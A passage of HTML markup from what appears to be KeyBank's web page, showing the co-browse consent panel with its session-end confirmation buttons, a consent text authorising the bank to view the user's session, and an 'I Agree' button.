href="javascript:void(0)">No</a><a id="V4LLPanel_CloseConfirmButtonTC" tabindex="0" role="button" aria-label="Confirm session end" onclick="LL_CustomUI.tcPanel.confirmSessionEnd(); return false;" style="box-sizing: content-box; height: 24px !important; background: transparent url('v4llpaneldisconnectbutton.png') no-repeat scroll 0% 0%; color: rgb(255, 255, 255); font-family: Trebuchet MS; font-size: 18px; font-weight: normal !important; font-style: normal !important; width: 103px; text-align: center; display: inline-block; text-decoration: none; padding-top: 3px; padding-bottom: 2px; margin-top: 35px;" href="javascript:void(0)">Yes</a></div></div><div class="v4-button-scroll-pane" style="overflow-wrap: break-word; font-family: Helvetica; height: 148px; text-align: left; margin-bottom: 21px; margin-top: 5px; width: 260px; margin-left: 10px; overflow-y: auto; overflow-x: hidden; color: rgb(255, 255, 255) !important; font-size: 11px !important;"><p style="width: 243px; margin-top: 0px; margin-bottom: 8px; font-family: Tahoma !important; font-size: 14px !important; color: rgb(255, 255, 255) !important;"></p><p style="width: 243px; margin-top: 7px; margin-bottom: 7px; line-height: 14px; font-family: Helvetica !important; font-size: 11px !important; color: rgb(255, 255, 255) !important;">Welcome to KeyBank Co-Browse. By clicking "I Agree" below, you authorize KeyBank  to view your current web session, subject to our Co-Browse Terms and Conditions* (see link below). You may end your session at any time by clicking "Disconnect" or closing your browser window.</p><div style="height: 15px; width: 1px; clear: both;"></div></div><div style="z-index: 10; left: 5px; height: 21px; position: absolute; top: 198px; width: 252px; background: transparent url('v4llpanelbackgroundgradient.png') repeat-x scroll left bottom !important;"></div><div style="clear: both;"></div><span id="V4LLPanel_StartSessionNow" role="button" tabindex="0.1" style="cursor: pointer; text-decoration: none; background: transparent url('v4llpanelstartsessionnowgray.png') repeat-x scroll left bottom; border: 0px none; padding: 5px 16px 7px 15px; font-size: 12px; color: rgb(254, 254, 254); font-family: Verdana;" disabled="disabled" aria-hidden="true">I Agree</span><div id="V4LLPanel_termsAndConditionsText" style="width: 252px; margin-left: 10px; padding-top: 18px; margin-top: 16px; text-align: center; background: transparent url('v4llpanelsepline.png') repeat-x scroll left top !important;" class="LLV4Separator"><a href="javascript:void(0)" onclick="LL_CustomUI.V4Panel.openTermsAndConditions(); return false;" id="V4LLPanel_TermsAndConditionsTC" style="font-weight: normal; margin-bottom: 6px; margin-top: 15px; font-size: 10px; color: rgb(162, 162, 162) !important; font-family: Trebuchet MS !important;" disabled="disabled" aria-hidden="true"></a></div></div></div></div></body>
</html>
